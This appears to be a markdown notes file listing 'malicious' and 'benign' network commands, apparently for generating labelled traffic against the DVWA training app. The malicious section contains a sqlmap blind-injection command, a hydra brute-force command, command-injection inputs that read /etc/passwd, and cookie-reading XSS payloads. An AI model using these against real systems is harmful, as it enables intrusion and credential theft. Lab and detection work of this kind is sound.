# Malicious

## sql blind injection

```
sqlmap \
-v 2 \
--level=1 \
--risk=1 \
--cookie="PHPSESSID=5ctsc0me25bvodumgphrutgm2h; security=low" \
--url "http://target.com/vulnerabilities/sqli_blind/?id=101&Submit=Submit"
```

## brute force

```
hydra target.com -l admin -P /usr/share/wordlists/rockyou.txt.gz http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=5ctsc0me25bvodumgphrutgm2h; security=low:Username and/or password incorrect."
```

## Command injection

```
127.0.0.1; ls
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
```

## XSS

- DOM

```
http://target.com/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

- Reflected
  ```<script>alert('test')</script>```

- Stored (same as above)

# Benign

## DNS

`dig www.metropolia.fi`

## Browsing

just browsing

## SSH

`ssh {ip_address}`

## FTP

- `ftp username:password@ftp://ftp.dlptest.com/`
- `ls`
- `pwd`
- `quit`

### Telnet

`telnet telehack.com`
